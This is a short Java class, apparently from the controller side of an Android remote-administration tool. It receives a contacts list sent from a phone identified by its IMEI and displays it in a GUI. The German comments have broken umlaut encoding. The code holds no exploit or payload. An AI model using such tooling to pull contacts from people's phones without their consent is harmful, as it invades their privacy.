package handler;

import server.Server;
import Packet.ContactsPacket;
import Packet.Packet;
import gui.GUI;

/**
 * Diese Klasse verarbeitet die Kontaktpakete.
 */
public class ContactsHandler implements PacketHandler {
	/**
	 * gui Die Benutzeroberfl�che
	 */
	private GUI gui;
	/**
	 * channel Der Datenkanal
	 */
	private int channel;
	/**
	 * imei Die IMEI des verbundenen Ger�tes
	 */
	private String imei;

	/**
	 * Der Konstruktor der Klasse wei�t die �bergebenen Daten den Klassenvariablen zu.
	 * @param chan	Der Datenkanal
	 * @param imei	Die IMEI
	 * @param gui	 Die Benutzeroberfl�che
	 */
	public ContactsHandler(int chan, String imei, GUI gui) {
		channel = chan;
		this.imei = imei;
		this.gui = gui;
	}

	@Override
	public void receive(Packet p, String imei) {
		// TODO Auto-generated method stub
	}

	/**
	 * Diese Methode wird einen Lognachricht erstellen, die auf der Gui angezeigt wird.
	 * Zus�tzlich wird der Listener f�r den Datenkanal entfertn und die Daten der updateContacts Methode �bergeben.
	 * Dadurch werden die Daten auf der GUi angezeigt.
	 * @param p	Das Paket
	 * @param temp_imei	Eine IMEI
	 * @param c	Der Server
	 */
	@Override
	public void handlePacket(Packet p, String temp_imei, Server c) {
		gui.logTxt("Contacts data has been received");
		c.getChannelHandlerMap().get(imei).removeListener(channel);
		ContactsPacket packet = (ContactsPacket) p;
		gui.updateContacts(imei, packet.getList());
	}
}
